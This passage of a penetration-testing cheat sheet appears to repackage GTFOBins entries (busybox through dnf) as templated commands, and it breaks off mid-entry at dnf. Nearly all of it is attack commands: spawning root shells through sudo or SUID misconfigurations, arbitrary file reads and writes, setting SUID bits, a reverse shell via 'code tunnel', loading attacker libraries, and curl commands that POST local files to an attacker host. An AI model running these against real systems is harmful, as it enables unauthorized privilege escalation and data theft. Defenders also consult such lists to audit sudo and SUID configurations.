```sh title:"GTFOBins Read Busybox Inherit #2 (inherits from Cat) (busybox inherit #2 inherit from cat (sudo / unprivileged)"
busybox cat
```
<!-- cheat
-->

## byebug

### byebug inherit (inherits from ruby)

Run byebug inherit (inherits from ruby) with the Gtfobins GTFOBins technique.

Inherit the capabilities of another binary by invoking it.

```sh title:"GTFOBins Run Byebug Inherit (inherits from Ruby) (byebug inherit from ruby (sudo / unprivileged)"
byebug --no-stop $script
```
<!-- cheat
var script
-->

## bzip2

There are also a number of other utilities that rely on `bzip2` under the hood, e.g., `bzless`, `bzcat`, `bunzip2`, etc. Besides having similar features, they also allow privileged reads if `bzip2` itself is SUID.

### bzip2 file-read

Read bzip2 file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Bzip2 File Read (bzip2 file read (sudo / suid / unprivileged)"
bzip2 -c $file_in | bzip2 -d
```
<!-- cheat
var file_in
-->

## c89

Alias of [gcc](#gcc). All techniques from `gcc` apply.

## c99

Alias of [gcc](#gcc). All techniques from `gcc` apply.

## cabal

### cabal shell

Spawn cabal shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Cabal Shell (cabal shell (sudo / suid / unprivileged)"
cabal exec --project-file=/dev/null -- /bin/sh
```
<!-- cheat
-->

#### cabal shell - suid override
Spawn cabal shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Cabal Shell (cabal shell (suid variant)"
cabal exec --project-file=/dev/null -- /bin/sh -p
```
<!-- cheat
-->

## cancel

### cancel upload

Upload cancel upload with the Gtfobins GTFOBins technique.

Data is sent as a POST request along with other content.

```sh title:"GTFOBins Upload Cancel Upload (cancel upload (sudo / suid / unprivileged)"
cancel -h $lhost:$lport -u $data
```
<!-- cheat
import tun_ip
import lports
var data
-->

## capsh

### capsh shell

Spawn capsh shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Capsh Shell (capsh shell (sudo / suid / unprivileged)"
capsh --
```
<!-- cheat
-->

#### capsh shell - suid override
Spawn capsh shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Capsh Shell (capsh shell (suid variant)"
capsh --gid=0 --uid=0 --
```
<!-- cheat
-->

## cargo

### cargo inherit (inherits from less)

Run cargo inherit (inherits from less) with the Gtfobins GTFOBins technique.

Inherit the capabilities of another binary by invoking it.

```sh title:"GTFOBins Run Cargo Inherit (inherits from Less) (cargo inherit from less (sudo / unprivileged)"
cargo help doc
```
<!-- cheat
-->

## cat

### cat file-read

Read cat file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Cat File Read (cat file read (sudo / suid / unprivileged)"
cat $file_in
```
<!-- cheat
var file_in
-->

## cc

Alias of [gcc](#gcc). All techniques from `gcc` apply.

## cdist

### cdist shell

Spawn cdist shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Cdist Shell (cdist shell (sudo / unprivileged)"
cdist shell -s /bin/sh
```
<!-- cheat
-->

## certbot

### certbot shell

Spawn certbot shell with the Gtfobins GTFOBins technique.

This needs a writable directory, replace `.` if needed.

```sh title:"GTFOBins Spawn Certbot Shell (certbot shell (sudo / unprivileged)"
certbot certonly -n -d x --standalone --dry-run --agree-tos --email x --logs-dir . --work-dir . --config-dir . --pre-hook '/bin/sh 1>&0 2>&0'
```
<!-- cheat
-->

## chattr

### chattr privilege-escalation

Run chattr privilege escalation with the Gtfobins GTFOBins technique.

Make the target file immutable.

```sh title:"GTFOBins Run Chattr Privilege Escalation (chattr privilege escalation (sudo / suid)"
chattr +i $file_in
```
<!-- cheat
var file_in
-->

## check_by_ssh

This is the `check_by_ssh` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.

### check_by_ssh shell

Check by ssh shell with the Gtfobins GTFOBins technique.

The shell will only last 10 seconds.

```sh title:"GTFOBins Check by Ssh Shell (check_by_ssh shell (sudo / unprivileged)"
check_by_ssh -o "ProxyCommand /bin/sh -i <$(tty) |& tee $(tty)" -H localhost -C x
```
<!-- cheat
-->

## check_cups

This is the `check_cups` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.

### check_cups file-read

Check cups file read with the Gtfobins GTFOBins technique.

The read file content is limited to the first line.

```sh title:"GTFOBins Check Cups File Read (check_cups file read (sudo / unprivileged)"
check_cups --extra-opts=@$file_in
```
<!-- cheat
var file_in
-->

## check_log

This is the `check_log` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.

### check_log file-read

Check log file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Check Log File Read (check_log file read (sudo / unprivileged)"
check_log -F $file_in -O /dev/stdout
```
<!-- cheat
var file_in
-->

### check_log file-write

Check log file write with the Gtfobins GTFOBins technique.

Write attacker-controlled data to an arbitrary path.

```sh title:"GTFOBins Check Log File Write (check_log file write (sudo / unprivileged)"
check_log -F $file_in -O $file_out
```
<!-- cheat
var file_in
var file_out
-->

## check_memory

This is the `check_memory` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.

### check_memory file-read

Check memory file read with the Gtfobins GTFOBins technique.

The read file content is limited to the first line.

```sh title:"GTFOBins Check Memory File Read (check_memory file read (sudo / unprivileged)"
check_memory --extra-opts=@$file_in
```
<!-- cheat
var file_in
-->

## check_raid

This is the `check_raid` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.

### check_raid file-read

Check raid file read with the Gtfobins GTFOBins technique.

The read file content is limited to the first line.

```sh title:"GTFOBins Check Raid File Read (check_raid file read (sudo / unprivileged)"
check_raid --extra-opts=@$file_in
```
<!-- cheat
var file_in
-->

## check_ssl_cert

This is the `check_ssl_cert` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.

### check_ssl_cert shell

Check ssl cert shell with the Gtfobins GTFOBins technique.

The shell will be invoked multiple times.

```sh title:"GTFOBins Check Ssl Cert Shell (check_ssl_cert shell (sudo / unprivileged)"
echo 'exec /bin/sh 0<&2 1>&2' >$tmp_file
chmod +x $tmp_file
check_ssl_cert --grep-bin $tmp_file -H x
```
<!-- cheat
var tmp_file
-->

## check_statusfile

This is the `check_statusfile` Nagios plugin, available e.g. in `/usr/lib/nagios/plugins/`.

### check_statusfile file-read

Check statusfile file read with the Gtfobins GTFOBins technique.

The read file content is limited to the first line.

```sh title:"GTFOBins Check Statusfile File Read (check_statusfile file read (sudo / unprivileged)"
check_statusfile $file_in
```
<!-- cheat
var file_in
-->

## chmod

### chmod privilege-escalation

Run chmod privilege escalation with the Gtfobins GTFOBins technique.

This can be run with elevated privileges to change permissions (`6` denotes the SUID bits) and then read, write, or execute a file.

```sh title:"GTFOBins Run Chmod Privilege Escalation (chmod privilege escalation (sudo / suid)"
chmod 6777 $file_in
```
<!-- cheat
var file_in
-->

## choom

### choom shell

Spawn choom shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Choom Shell (choom shell (sudo / suid / unprivileged)"
choom -n 0 /bin/sh
```
<!-- cheat
-->

#### choom shell - suid override
Spawn choom shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Choom Shell (choom shell (suid variant)"
choom -n 0 -- /bin/sh -p
```
<!-- cheat
-->

## chown

### chown privilege-escalation

Run chown privilege escalation with the Gtfobins GTFOBins technique.

This can be run with elevated privileges to change ownership and then read, write, or execute a file.

```sh title:"GTFOBins Run Chown Privilege Escalation (chown privilege escalation (sudo / suid)"
chown $(id -un):$(id -gn) $file_in
```
<!-- cheat
var file_in
-->

## chroot

### chroot shell

Spawn chroot shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Chroot Shell (chroot shell (sudo / suid)"
chroot /
```
<!-- cheat
-->

#### chroot shell - suid override
Spawn chroot shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Chroot Shell (chroot shell (suid variant)"
chroot / /bin/sh -p
```
<!-- cheat
-->

## chrt

### chrt shell

Spawn chrt shell with the Gtfobins GTFOBins technique.

Any number between 1 and 99 will do.

```sh title:"GTFOBins Spawn Chrt Shell (chrt shell (sudo / suid / unprivileged)"
chrt 1 /bin/sh
```
<!-- cheat
-->

#### chrt shell - suid override
Spawn chrt shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Chrt Shell (chrt shell (suid variant)"
chrt 1 /bin/sh -p
```
<!-- cheat
-->

## clamscan

### clamscan file-read

Read clamscan file read with the Gtfobins GTFOBins technique.

Each line of the file is interpreted as a path and the content is leaked via error messages. The output can optionally be cleaned using `sed`.

```sh title:"GTFOBins Read Clamscan File Read (clamscan file read (sudo / suid / unprivileged)"
touch x.yara
clamscan --no-summary -d x.yara -f $file_in 2>&1 | sed -nE 's/^(.*): No such file or directory$/\1/p'
```
<!-- cheat
var file_in
-->

## clisp

### clisp shell

Spawn clisp shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Clisp Shell (clisp shell (sudo / suid / unprivileged)"
clisp -x '(ext:run-shell-command "/bin/sh")(ext:exit)'
```
<!-- cheat
-->

## cmake

### cmake shell

Spawn cmake shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Cmake Shell (cmake shell (sudo / unprivileged)"
echo 'execute_process(COMMAND /bin/sh)' >$cmake_file
cmake $path
```
<!-- cheat
var cmake_file
var path
-->

### cmake file-read

Read cmake file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Cmake File Read (cmake file read (sudo / unprivileged)"
cmake -E cat $file_in
```
<!-- cheat
var file_in
-->

## cmp

### cmp file-read

Read cmp file read with the Gtfobins GTFOBins technique.

Dump the bytes of the input file that are different from the NUL byte in a tabular format.

```sh title:"GTFOBins Read Cmp File Read (cmp file read (sudo / suid / unprivileged)"
cmp $file_in /dev/zero -b -l
```
<!-- cheat
var file_in
-->

## cobc

### cobc shell

Spawn cobc shell with the Gtfobins GTFOBins technique.

The `$tmp_file` sill be overwritten after the execution.

```sh title:"GTFOBins Spawn Cobc Shell (cobc shell (sudo / suid / unprivileged)"
echo 'CALL "SYSTEM" USING "/bin/sh".' >$tmp_file
cobc -xFj --frelax-syntax-checks $tmp_file
```
<!-- cheat
var tmp_file
-->

## code

### code reverse-shell

Start code reverse shell with the Gtfobins GTFOBins technique.

This requires a valid GitHub account.  Run the command locally, then on the attacker box navigate to <https://github.com/login/device>, using the provided code to authorize the tunnel.

```sh title:"GTFOBins Start Code Reverse Shell (code reverse shell (sudo / unprivileged)"
code tunnel --name xxxxxx
```
<!-- cheat
-->

### code download

Download code download with the Gtfobins GTFOBins technique.

This requires a valid GitHub account.  Run the command locally, then on the attacker box navigate to <https://github.com/login/device>, using the provided code to authorize the tunnel.

```sh title:"GTFOBins Download Code Download (code download (sudo / unprivileged)"
code tunnel --name xxxxxx
```
<!-- cheat
-->

### code upload

Upload code upload with the Gtfobins GTFOBins technique.

This requires a valid GitHub account.  Run the command locally, then on the attacker box navigate to <https://github.com/login/device>, using the provided code to authorize the tunnel.

```sh title:"GTFOBins Upload Code Upload (code upload (sudo / unprivileged)"
code tunnel --name xxxxxx
```
<!-- cheat
-->

## codex

### codex shell

Spawn codex shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Codex Shell (codex shell (sudo / unprivileged)"
codex sandbox linux /bin/sh
```
<!-- cheat
-->

## column

### column file-read

Read column file read with the Gtfobins GTFOBins technique.

This program expects textual data.

```sh title:"GTFOBins Read Column File Read (column file read (sudo / suid / unprivileged)"
column $file_in
```
<!-- cheat
var file_in
-->

## comm

### comm file-read

Read comm file read with the Gtfobins GTFOBins technique.

A newline is appended to the file.

```sh title:"GTFOBins Read Comm File Read (comm file read (sudo / suid / unprivileged)"
comm $file_in /dev/null
```
<!-- cheat
var file_in
-->

## composer

### composer shell

Spawn composer shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Composer Shell (composer shell (sudo / unprivileged)"
echo '{"scripts":{"x":"/bin/sh"}}' >composer.json
composer run-script x
```
<!-- cheat
-->

## cowsay

### cowsay inherit (inherits from perl)

Run cowsay inherit (inherits from perl) with the Gtfobins GTFOBins technique.

Inherit the capabilities of another binary by invoking it.

```sh title:"GTFOBins Run Cowsay Inherit (inherits from Perl) (cowsay inherit from perl (sudo / unprivileged)"
cowsay -f $script x
```
<!-- cheat
var script
-->

## cowthink

### cowthink inherit (inherits from perl)

Run cowthink inherit (inherits from perl) with the Gtfobins GTFOBins technique.

Inherit the capabilities of another binary by invoking it.

```sh title:"GTFOBins Run Cowthink Inherit (inherits from Perl) (cowthink inherit from perl (sudo / unprivileged)"
cowthink -f $script x
```
<!-- cheat
var script
-->

## cp

### cp file-read

Read cp file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Cp File Read (cp file read (sudo / suid / unprivileged)"
cp $file_in /dev/stdout
```
<!-- cheat
var file_in
-->

### cp file-write

Write cp file write with the Gtfobins GTFOBins technique.

Write attacker-controlled data to an arbitrary path.

```sh title:"GTFOBins Write Cp File Write (cp file write (sudo / suid / unprivileged)"
echo $data | cp /dev/stdin $file_out
```
<!-- cheat
var data
var file_out
-->

### cp privilege-escalation #1

Run cp privilege escalation #1 with the Gtfobins GTFOBins technique.

This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)

```sh title:"GTFOBins Run Cp Privilege Escalation #1 (cp privilege escalation (sudo / suid)"
cp $file_in $file_out
```
<!-- cheat
var file_in
var file_out
-->

### cp privilege-escalation #2

Run cp privilege escalation #2 with the Gtfobins GTFOBins technique.

This can copy SUID permissions from any SUID binary (e.g., `$file_in`) to another.

```sh title:"GTFOBins Run Cp Privilege Escalation #2 (cp privilege escalation (sudo / suid)"
cp --attributes-only --preserve=all $file_in $file_out
```
<!-- cheat
var file_in
var file_out
-->

## cpan

### cpan inherit (inherits from perl)

Run cpan inherit (inherits from perl) with the Gtfobins GTFOBins technique.

Perl code can be executed with the `!` command.

```sh title:"GTFOBins Run Cpan Inherit (inherits from Perl) (cpan inherit from perl (sudo / unprivileged)"
cpan
! ...
```
<!-- cheat
-->

## cpio

### cpio shell

Spawn cpio shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Cpio Shell (cpio shell (sudo)"
echo '/bin/sh </dev/tty >/dev/tty' >localhost
cpio -o --rsh-command /bin/sh -F localhost:
```
<!-- cheat
-->

### cpio file-read #1

Read cpio file read #1 with the Gtfobins GTFOBins technique.

The content of the file is printed to standard output, between the `cpio` archive format header and footer.

```sh title:"GTFOBins Read Cpio File Read #1 (cpio file read (sudo / suid / unprivileged)"
echo $file_in | cpio -o
```
<!-- cheat
var file_in
-->

### cpio file-read #2

Read cpio file read #2 with the Gtfobins GTFOBins technique.

The whole directory structure is copied to `.`, hence this is also a file write.

```sh title:"GTFOBins Read Cpio File Read #2 (cpio file read (sudo / suid / unprivileged)"
echo $file_in | cpio -dp .
cat $file_in
```
<!-- cheat
var file_in
-->

#### cpio file-read #2 - sudo override
Read cpio file read #2 with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Read Cpio File Read #2 (cpio file read (sudo variant)"
echo $file_in | cpio -R $UID -dp .
cat $file_in
```
<!-- cheat
var file_in
-->

#### cpio file-read #2 - suid override
Read cpio file read #2 with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Read Cpio File Read #2 (cpio file read (suid variant)"
echo $file_in | cpio -R $UID -dp .
cat $file_in
```
<!-- cheat
var file_in
-->

### cpio file-write

Write cpio file write with the Gtfobins GTFOBins technique.

The whole directory structure is copied to `.`, with the data written to `$tmp_file`.

```sh title:"GTFOBins Write Cpio File Write (cpio file write (sudo / suid / unprivileged)"
echo $data >$tmp_file
echo $tmp_file | cpio -udp .
```
<!-- cheat
var data
var tmp_file
-->

#### cpio file-write - sudo override
Write cpio file write with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Write Cpio File Write (cpio file write (sudo variant)"
echo $data >$tmp_file
echo $tmp_file | cpio -R 0:0 -udp .
```
<!-- cheat
var data
var tmp_file
-->

#### cpio file-write - suid override
Write cpio file write with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Write Cpio File Write (cpio file write (suid variant)"
echo $data >$tmp_file
echo $tmp_file | cpio -R 0:0 -udp .
```
<!-- cheat
var data
var tmp_file
-->

## cpulimit

### cpulimit shell

Spawn cpulimit shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Cpulimit Shell (cpulimit shell (sudo / suid / unprivileged)"
cpulimit -l 100 -f -- /bin/sh
```
<!-- cheat
-->

#### cpulimit shell - suid override
Spawn cpulimit shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Cpulimit Shell (cpulimit shell (suid variant)"
cpulimit -l 100 -f -- /bin/sh -p
```
<!-- cheat
-->

## crash

### crash command

Execute crash command with the Gtfobins GTFOBins technique.

Execute an arbitrary non-interactive command.

```sh title:"GTFOBins Execute Crash Command (crash command (sudo / unprivileged)"
CRASHPAGER=$cmd_file crash -h
```
<!-- cheat
var cmd_file
-->

### crash inherit (inherits from less)

Run crash inherit (inherits from less) with the Gtfobins GTFOBins technique.

Inherit the capabilities of another binary by invoking it.

```sh title:"GTFOBins Run Crash Inherit (inherits from Less) (crash inherit from less (sudo / suid / unprivileged)"
crash -h
```
<!-- cheat
-->

## crontab

### crontab command

Execute crontab command with the Gtfobins GTFOBins technique.

This spaws the default editor to edit the crontab file, commands can be scheduled to run using the [cron syntax](https://en.wikipedia.org/wiki/Cron).

```sh title:"GTFOBins Execute Crontab Command (crontab command (sudo / unprivileged)"
crontab -e
```
<!-- cheat
-->

### crontab inherit (inherits from vi)

Run crontab inherit (inherits from vi) with the Gtfobins GTFOBins technique.

Inherit the capabilities of another binary by invoking it.

```sh title:"GTFOBins Run Crontab Inherit (inherits from Vi) (crontab inherit from vi (sudo / unprivileged)"
crontab -e
```
<!-- cheat
-->

## csh

### csh shell

Spawn csh shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Csh Shell (csh shell (sudo / suid / unprivileged)"
csh
```
<!-- cheat
-->

#### csh shell - suid override
Spawn csh shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Csh Shell (csh shell (suid variant)"
csh -b
```
<!-- cheat
-->

### csh file-write

Write csh file write with the Gtfobins GTFOBins technique.

Write attacker-controlled data to an arbitrary path.

```sh title:"GTFOBins Write Csh File Write (csh file write (sudo / suid / unprivileged)"
csh -c 'echo $data >$file_out'
```
<!-- cheat
var data
var file_out
-->

#### csh file-write - suid override
Write csh file write with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Write Csh File Write (csh file write (suid variant)"
csh -c 'echo $data >$file_out' -b
```
<!-- cheat
var data
var file_out
-->

## csplit

### csplit file-read

Read csplit file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Csplit File Read (csplit file read (sudo / suid / unprivileged)"
csplit $file_in 1
cat xx01
```
<!-- cheat
var file_in
-->

### csplit file-write

Write csplit file write with the Gtfobins GTFOBins technique.

Writes the data to `xx0output-file` in the current working directory. If needed, a different prefix can be specified with `-f` (instead of `xx`).

```sh title:"GTFOBins Write Csplit File Write (csplit file write (sudo / suid / unprivileged)"
echo $data >$tmp_file
csplit -z -b '%doutput-file' $tmp_file 1
```
<!-- cheat
var data
var tmp_file
-->

## csvtool

### csvtool shell

Spawn csvtool shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Csvtool Shell (csvtool shell (sudo / suid / unprivileged)"
csvtool call '/bin/sh;false' /etc/hosts
```
<!-- cheat
-->

### csvtool file-read

Read csvtool file read with the Gtfobins GTFOBins technique.

The file is actually parsed and manipulated as CSV.

```sh title:"GTFOBins Read Csvtool File Read (csvtool file read (sudo / suid / unprivileged)"
csvtool trim t $file_in
```
<!-- cheat
var file_in
-->

### csvtool file-write

Write csvtool file write with the Gtfobins GTFOBins technique.

The file is actually parsed and manipulated as CSV.

```sh title:"GTFOBins Write Csvtool File Write (csvtool file write (sudo / suid / unprivileged)"
echo $data >$tmp_file
csvtool trim t $tmp_file -o $file_out
```
<!-- cheat
var data
var file_out
var tmp_file
-->

## ctr

### ctr shell

Spawn ctr shell with the Gtfobins GTFOBins technique.

An image must be already present, for example:  ``` ctr images pull docker.io/library/alpine:latest ```

```sh title:"GTFOBins Spawn Ctr Shell (ctr shell (sudo / suid)"
ctr run --rm --mount type=bind,src=/,dst=/,options=rbind -t docker.io/library/alpine:latest x
```
<!-- cheat
-->

## cupsfilter

### cupsfilter file-read

Read cupsfilter file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Cupsfilter File Read (cupsfilter file read (sudo / suid / unprivileged)"
cupsfilter -i application/octet-stream -m application/octet-stream $file_in
```
<!-- cheat
var file_in
-->

## curl

### curl file-read

Read curl file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Curl File Read (curl file read (sudo / suid / unprivileged)"
curl file://$file_in
```
<!-- cheat
var file_in
-->

### curl file-write

Write curl file write with the Gtfobins GTFOBins technique.

Write attacker-controlled data to an arbitrary path.

```sh title:"GTFOBins Write Curl File Write (curl file write (sudo / suid / unprivileged)"
echo $data >$tmp_file
curl file://$tmp_file -o $file_out
```
<!-- cheat
var data
var file_out
var tmp_file
-->

### curl download

Download curl download with the Gtfobins GTFOBins technique.

Pull a remote file to disk.

```sh title:"GTFOBins Download Curl Download (curl download (sudo / suid / unprivileged)"
curl $scheme://$lhost$file_in -o $file_out
```
<!-- cheat
import tun_ip
import scheme
var file_in
var file_out
-->

### curl upload #1

Upload curl upload #1 with the Gtfobins GTFOBins technique.

Push a local file to a remote receiver.

```sh title:"GTFOBins Upload Curl Upload #1 (curl upload (sudo / suid / unprivileged)"
curl -X POST --data-binary @$file_in $scheme://$lhost
```
<!-- cheat
import tun_ip
import scheme
var file_in
-->

### curl upload #2

Upload curl upload #2 with the Gtfobins GTFOBins technique.

Push a local file to a remote receiver.

```sh title:"GTFOBins Upload Curl Upload #2 (curl upload (sudo / suid / unprivileged)"
curl -X POST --data-binary $data $scheme://$lhost
```
<!-- cheat
import tun_ip
import scheme
var data
-->

### curl upload #3

Upload curl upload #3 with the Gtfobins GTFOBins technique.

Data will be `\r\n` terminated.

```sh title:"GTFOBins Upload Curl Upload #3 (curl upload (sudo / suid / unprivileged)"
curl gopher://$lhost:$lport/_DATA
```
<!-- cheat
import tun_ip
import lports
-->

### curl library-load

Probe curl library load with the Gtfobins GTFOBins technique.

Load an attacker-supplied shared library.

```sh title:"GTFOBins Probe Curl Library Load (curl library load (sudo / suid / unprivileged)"
curl --engine $lib x
```
<!-- cheat
var lib
-->

## cut

### cut file-read

Read cut file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Cut File Read (cut file read (sudo / suid / unprivileged)"
cut -d '' -f1 $file_in
```
<!-- cheat
var file_in
-->

## dash

### dash shell

Spawn dash shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Dash Shell (dash shell (sudo / suid / unprivileged)"
dash
```
<!-- cheat
-->

### dash file-write

Write dash file write with the Gtfobins GTFOBins technique.

Write attacker-controlled data to an arbitrary path.

```sh title:"GTFOBins Write Dash File Write (dash file write (sudo / suid / unprivileged)"
dash -c 'echo $data >$file_out'
```
<!-- cheat
var data
var file_out
-->

## date

### date file-read

Read date file read with the Gtfobins GTFOBins technique.

Each line is corrupted by a prefix string and wrapped inside quotes.

```sh title:"GTFOBins Read Date File Read (date file read (sudo / suid / unprivileged)"
date -f $file_in
```
<!-- cheat
var file_in
-->

## dc

### dc shell

Spawn dc shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Dc Shell (dc shell (sudo / suid / unprivileged)"
dc -e '!/bin/sh'
```
<!-- cheat
-->

## dd

### dd file-read

Read dd file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Dd File Read (dd file read (sudo / suid / unprivileged)"
dd if=$file_in
```
<!-- cheat
var file_in
-->

### dd file-write

Write dd file write with the Gtfobins GTFOBins technique.

Write attacker-controlled data to an arbitrary path.

```sh title:"GTFOBins Write Dd File Write (dd file write (sudo / suid / unprivileged)"
echo $data | dd of=$file_out
```
<!-- cheat
var data
var file_out
-->

## debugfs

### debugfs shell

Spawn debugfs shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Debugfs Shell (debugfs shell (sudo / suid / unprivileged)"
debugfs
!/bin/sh
```
<!-- cheat
-->

## dhclient

### dhclient shell

Spawn dhclient shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Dhclient Shell (dhclient shell (sudo / unprivileged)"
dhclient -sf /bin/sh
```
<!-- cheat
-->

## dialog

### dialog file-read

Read dialog file read with the Gtfobins GTFOBins technique.

The file is shown in an interactive TUI dialog.

```sh title:"GTFOBins Read Dialog File Read (dialog file read (sudo / suid / unprivileged)"
dialog --textbox $file_in 0 0
```
<!-- cheat
var file_in
-->

## diff

### diff file-read #1

Read diff file read #1 with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Diff File Read #1 (diff file read (sudo / suid / unprivileged)"
diff --line-format=%L /dev/null $file_in
```
<!-- cheat
var file_in
-->

### diff file-read #2

Read diff file read #2 with the Gtfobins GTFOBins technique.

This lists the content of a directory. `$dir_empty` can be any directory, but for convenience it is better to use an empty directory to avoid noise output.

```sh title:"GTFOBins Read Diff File Read #2 (diff file read (sudo / suid / unprivileged)"
diff --recursive $dir_empty $dir_in/
```
<!-- cheat
var dir_empty
var dir_in
-->

## dig

### dig file-read

Read dig file read with the Gtfobins GTFOBins technique.

Each input line is treated as a lookup query for the `dig` command and the output is corrupted with the result or errors of the operation.

```sh title:"GTFOBins Read Dig File Read (dig file read (sudo / suid / unprivileged)"
dig -f $file_in
```
<!-- cheat
var file_in
-->

## distcc

### distcc shell

Spawn distcc shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Distcc Shell (distcc shell (sudo / suid / unprivileged)"
distcc /bin/sh
```
<!-- cheat
-->

#### distcc shell - suid override
Spawn distcc shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Distcc Shell (distcc shell (suid variant)"
distcc /bin/sh -p
```
<!-- cheat
-->

## dmesg

### dmesg file-read

Read dmesg file read with the Gtfobins GTFOBins technique.

Read the contents of an arbitrary file.

```sh title:"GTFOBins Read Dmesg File Read (dmesg file read (sudo / suid / unprivileged)"
dmesg -rF $file_in
```
<!-- cheat
var file_in
-->

### dmesg inherit (inherits from less)

Run dmesg inherit (inherits from less) with the Gtfobins GTFOBins technique.

Inherit the capabilities of another binary by invoking it.

```sh title:"GTFOBins Run Dmesg Inherit (inherits from Less) (dmesg inherit from less (sudo / suid / unprivileged)"
dmesg -H
```
<!-- cheat
-->

## dmidecode

### dmidecode file-write

Write dmidecode file write with the Gtfobins GTFOBins technique.

It can be used to write files using a specially crafted SMBIOS file that can be read as a memory device by dmidecode. Generate the file with [dmiwrite](https://github.com/adamreiser/dmiwrite) and upload it to the target.  - `--dump-bin`, will cause dmidecode to write the payload to the destination specified, prepended with 32 null bytes.  - `--no-sysfs`, if the target system is using an older version of dmidecode, you may need to omit the option.  ``` make dmiwrite echo $data >$tmp_file ./dmiwrite $tmp_file x.dmi ```

```sh title:"GTFOBins Write Dmidecode File Write (dmidecode file write (unprivileged)"
dmidecode --no-sysfs -d x.dmi --dump-bin $file_out
```
<!-- cheat
var file_out
-->

## dmsetup

### dmsetup shell

Spawn dmsetup shell with the Gtfobins GTFOBins technique.

Spawn an interactive shell. With sudo/suid this drops you to root.

```sh title:"GTFOBins Spawn Dmsetup Shell (dmsetup shell (sudo / suid / unprivileged)"
dmsetup create base <<EOF
0 3534848 linear /dev/loop0 94208
EOF
dmsetup ls --exec '/bin/sh -s'
```
<!-- cheat
-->

#### dmsetup shell - suid override
Spawn dmsetup shell with the Gtfobins GTFOBins technique.

```sh title:"GTFOBins Spawn Dmsetup Shell (dmsetup shell (suid variant)"
dmsetup create base <<EOF
0 3534848 linear /dev/loop0 94208
EOF
dmsetup ls --exec '/bin/sh -p -s'
```
<!-- cheat
-->

## dnf

### dnf command

Execute dnf command with the Gtfobins GTFOBins technique.

Generate the RPM package with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.  ``` echo $cmd_file >x.sh fpm -n x -s dir -t rpm -a all --before-install x.sh . ```  The `--disablerepo=*` option is used for targets without Internet connectivity, can be omitted otherwise.

```sh title:"GTFOBins Execute Dnf Command (dnf command (sudo)"
